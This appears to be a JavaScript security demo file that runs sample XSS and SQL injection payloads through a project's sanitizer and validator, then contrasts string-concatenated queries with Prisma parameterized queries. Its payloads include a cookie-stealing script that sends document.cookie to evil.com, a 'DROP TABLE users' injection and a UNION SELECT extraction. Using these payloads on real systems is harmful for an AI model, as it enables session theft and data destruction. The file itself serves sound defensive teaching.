/**
 * Security Testing & Demonstration
 * Before/After examples of XSS and SQL Injection prevention
 *
 * RUN: node lib/security/demo.js (after compiling TypeScript)
 */

import {
  sanitizeHtmlInput,
  hasXSSPatterns,
  hasSQLiPatterns,
  validateInput,
  SanitizationLevel,
} from "./sanitizer";

/**
 * XSS Attack Examples
 */
const xssAttacks = [
  {
    name: "Script Tag Injection",
    payload: '<script>alert("XSS Attack!")</script>',
    description: "Classic script tag injection in user input",
  },
  {
    name: "Event Handler Injection",
    payload: "<img src=x onerror=\"alert('XSS')\" />",
    description: "Malicious event handler in image tag",
  },
  {
    name: "Iframe Injection",
    payload: '<iframe src="https://evil.com"></iframe>',
    description: "Embedding malicious iframe",
  },
  {
    name: "Data Attribute XSS",
    payload:
      '<div data-test="test" onmouseover="alert(\'XSS\')">Hover me</div>',
    description: "XSS via data attributes and event handlers",
  },
  {
    name: "JavaScript Protocol",
    payload: "<a href=\"javascript:alert('XSS')\">Click me</a>",
    description: "JavaScript protocol in href attribute",
  },
  {
    name: "SVG Script Injection",
    payload: "<svg onload=\"alert('XSS')\"></svg>",
    description: "XSS via SVG onload handler",
  },
];

/**
 * SQL Injection Attack Examples
 */
const sqliAttacks = [
  {
    name: "Classic OR 1=1",
    payload: "' OR '1'='1",
    description: "Classic SQL injection to bypass authentication",
  },
  {
    name: "Comment-based Injection",
    payload: "admin' --",
    description: "Using SQL comments to bypass password check",
  },
  {
    name: "Union-based Injection",
    payload: "' UNION SELECT * FROM users --",
    description: "Extracting data from multiple tables",
  },
  {
    name: "Time-based Blind Injection",
    payload: "'; WAITFOR DELAY '00:00:05' --",
    description: "Blind SQL injection using time delays",
  },
  {
    name: "Stacked Queries",
    payload: "'; DROP TABLE users; --",
    description: "Executing multiple SQL statements",
  },
];

/**
 * Demonstration function
 */
export function demonstrateSecurity() {
  console.log(
    "╔═══════════════════════════════════════════════════════════════╗"
  );
  console.log(
    "║          XSS & SQLi Prevention Demonstration                  ║"
  );
  console.log(
    "║              Input Sanitization & OWASP Compliance            ║"
  );
  console.log(
    "╚═══════════════════════════════════════════════════════════════╝\n"
  );

  // ========== XSS ATTACKS ==========
  console.log(
    "┌─────────────────────────────────────────────────────────────┐"
  );
  console.log(
    "│                   XSS ATTACK PREVENTION                      │"
  );
  console.log(
    "└─────────────────────────────────────────────────────────────┘\n"
  );

  xssAttacks.forEach((attack, index) => {
    console.log(`\n${"─".repeat(60)}`);
    console.log(`${index + 1}. ${attack.name}`);
    console.log(`   Description: ${attack.description}`);
    console.log(`${"─".repeat(60)}`);

    console.log("\n   BEFORE SANITIZATION:");
    console.log(`   Input: ${attack.payload}`);
    console.log(`   ✗ Status: UNSAFE - Script would execute`);
    console.log(
      `   ✗ Detected XSS Pattern: ${hasXSSPatterns(attack.payload) ? "YES" : "NO"}`
    );

    const sanitized = sanitizeHtmlInput(
      attack.payload,
      SanitizationLevel.STRICT
    );
    console.log("\n   AFTER SANITIZATION (STRICT):");
    console.log(`   Output: ${sanitized}`);
    console.log(`   ✓ Status: SAFE - All tags removed`);
    console.log(
      `   ✓ Detected XSS Pattern: ${hasXSSPatterns(sanitized) ? "YES" : "NO"}`
    );

    const sanitizedModerate = sanitizeHtmlInput(
      attack.payload,
      SanitizationLevel.MODERATE
    );
    console.log("\n   AFTER SANITIZATION (MODERATE):");
    console.log(`   Output: ${sanitizedModerate}`);
    console.log(`   ✓ Status: SAFE - Dangerous tags removed`);
    console.log(
      `   ✓ Detected XSS Pattern: ${hasXSSPatterns(sanitizedModerate) ? "YES" : "NO"}`
    );
  });

  // ========== SQL INJECTION ATTACKS ==========
  console.log(
    "\n\n┌─────────────────────────────────────────────────────────────┐"
  );
  console.log(
    "│                  SQL INJECTION PREVENTION                     │"
  );
  console.log(
    "└─────────────────────────────────────────────────────────────┘\n"
  );

  sqliAttacks.forEach((attack, index) => {
    console.log(`\n${"─".repeat(60)}`);
    console.log(`${index + 1}. ${attack.name}`);
    console.log(`   Description: ${attack.description}`);
    console.log(`${"─".repeat(60)}`);

    console.log("\n   BEFORE SANITIZATION:");
    console.log(`   Input: ${attack.payload}`);
    console.log(`   ✗ Status: UNSAFE - SQL injection possible`);
    console.log(
      `   ✗ Detected SQLi Pattern: ${hasSQLiPatterns(attack.payload) ? "YES" : "NO"}`
    );

    const validation = validateInput(attack.payload, {
      required: true,
      checkXSS: false,
      checkSQLi: true,
    });

    console.log("\n   AFTER VALIDATION:");
    console.log(`   Valid: ${validation.valid}`);
    console.log(`   Message: ${validation.message}`);
    console.log(`   ✓ Status: BLOCKED - Malicious pattern detected`);
  });

  // ========== SANITIZATION COMPARISON ==========
  console.log(
    "\n\n┌─────────────────────────────────────────────────────────────┐"
  );
  console.log(
    "│               SANITIZATION LEVEL COMPARISON                   │"
  );
  console.log(
    "└─────────────────────────────────────────────────────────────┘\n"
  );

  const complexPayload =
    "<p>Hello <strong onclick=\"alert('xss')\">World</strong></p>";

  console.log(`Input: ${complexPayload}\n`);

  console.log(
    `STRICT (Plain text only):\n  ${sanitizeHtmlInput(complexPayload, SanitizationLevel.STRICT)}\n`
  );

  console.log(
    `MODERATE (Safe HTML tags):\n  ${sanitizeHtmlInput(complexPayload, SanitizationLevel.MODERATE)}\n`
  );

  console.log(
    `MINIMAL (Basic sanitization):\n  ${sanitizeHtmlInput(complexPayload, SanitizationLevel.MINIMAL)}\n`
  );

  // ========== REAL-WORLD SCENARIOS ==========
  console.log(
    "\n┌─────────────────────────────────────────────────────────────┐"
  );
  console.log(
    "│              REAL-WORLD USAGE EXAMPLES                       │"
  );
  console.log(
    "└─────────────────────────────────────────────────────────────┘\n"
  );

  // Scenario 1: Comment submission
  console.log("SCENARIO 1: User Comments");
  console.log("─".repeat(60));
  const userComment =
    '<script>fetch("https://evil.com?cookie=" + document.cookie)</script> This is a great startup!';

  console.log(`User input: ${userComment}`);

  const validation1 = validateInput(userComment, {
    required: true,
    minLength: 1,
    maxLength: 500,
    checkXSS: true,
    checkSQLi: true,
  });

  if (!validation1.valid) {
    console.log(`\n✓ VALIDATION FAILED (As expected!)`);
    console.log(`  Reason: ${validation1.message}`);
    console.log(`  Action: Comment submission rejected\n`);
  }

  // Scenario 2: Search query
  console.log("\nSCENARIO 2: Search Query");
  console.log("─".repeat(60));
  const searchQuery = "' OR '1'='1' -- normal search query";

  console.log(`User input: ${searchQuery}`);

  const validation2 = validateInput(searchQuery, {
    required: true,
    checkXSS: true,
    checkSQLi: true,
  });

  if (!validation2.valid) {
    console.log(`\n✓ VALIDATION FAILED (As expected!)`);
    console.log(`  Reason: ${validation2.message}`);
    console.log(`  Action: Search rejected\n`);
  }

  // Scenario 3: Newsletter content (HTML allowed)
  console.log("\nSCENARIO 3: Newsletter Content (Moderate HTML)");
  console.log("─".repeat(60));
  const newsContent =
    '<p>Check out <a href="https://example.com">our new features</a>!</p><script>alert("xss")</script>';

  console.log(`User input: ${newsContent}`);

  const sanitized3 = sanitizeHtmlInput(newsContent, SanitizationLevel.MODERATE);
  console.log(`\n✓ SANITIZED OUTPUT:`);
  console.log(`  ${sanitized3}`);
  console.log(`  Action: Safe HTML preserved, malicious script removed\n`);

  // ========== PARAMETERIZED QUERY EXAMPLE ==========
  console.log(
    "\n┌─────────────────────────────────────────────────────────────┐"
  );
  console.log(
    "│         PARAMETERIZED QUERIES (ORM PROTECTION)               │"
  );
  console.log(
    "└─────────────────────────────────────────────────────────────┘\n"
  );

  console.log("UNSAFE (String concatenation):");
  console.log("────────────────────────────────────");
  const unsafeQuery = `SELECT * FROM users WHERE username = '${searchQuery}'`;
  console.log(`Query: ${unsafeQuery}`);
  console.log("✗ DANGER: SQL injection possible!\n");

  console.log("SAFE (Parameterized - Prisma):");
  console.log("────────────────────────────────────");
  console.log(
    "Code: await prisma.user.findMany({ where: { username: searchQuery } })"
  );
  console.log("✓ SAFE: Parameter binding prevents injection");
  console.log("✓ Prisma automatically handles parameterization\n");

  // ========== SUMMARY ==========
  console.log(
    "\n┌─────────────────────────────────────────────────────────────┐"
  );
  console.log(
    "│                    SECURITY SUMMARY                          │"
  );
  console.log(
    "└─────────────────────────────────────────────────────────────┘\n"
  );

  console.log("✓ XSS Prevention:");
  console.log("  • Input sanitization removes dangerous tags");
  console.log("  • Output encoding prevents script execution");
  console.log("  • DOMPurify on client-side (React components)");
  console.log("  • Content Security Policy headers restrict inline scripts\n");

  console.log("✓ SQL Injection Prevention:");
  console.log("  • Prisma ORM with parameterized queries");
  console.log("  • Input validation detects malicious patterns");
  console.log("  • Avoid string concatenation in queries");
  console.log("  • Use typed query builders\n");

  console.log("✓ Additional Protections:");
  console.log("  • Security headers (CSP, X-Frame-Options, etc.)");
  console.log("  • Rate limiting prevents brute force attacks");
  console.log("  • Request size limits prevent DoS");
  console.log("  • CORS controls cross-origin requests\n");

  console.log("═".repeat(63));
  console.log(
    "All security features are active and protecting your application!"
  );
  console.log("═".repeat(63));
}

// Run demo if executed directly
if (require.main === module) {
  demonstrateSecurity();
}
